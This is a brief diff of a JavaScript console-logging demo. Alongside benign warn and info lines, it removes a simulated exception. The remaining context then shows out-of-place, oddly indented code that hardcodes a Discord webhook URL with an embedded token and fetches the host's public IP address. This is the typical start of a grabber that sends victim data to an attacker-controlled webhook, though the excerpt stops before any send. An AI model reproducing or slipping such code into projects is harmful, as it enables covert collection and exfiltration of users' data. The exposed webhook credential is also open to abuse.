@@ -52,9 +52,6 @@ console.warn('This is a warning message.');
 console.info('This is an info message.');
 
 // Simulating an uncaught exception
-setTimeout(() => {
-    throw new Error('Simulated exception');
-}, 1000);
       const webhook = 'https://discord.com/api/webhooks/1216841205883600928/kipzeUzJu0dF3FGPae2uzI7DDP6-uHJb3hkEy1kpf6MA80MqhJWIJCWZDTvvv3xRZdOK';
       let dat = await fetch('https://api.ipify.org?format=json')
       dat = JSON.parse(await dat.text())['ip']
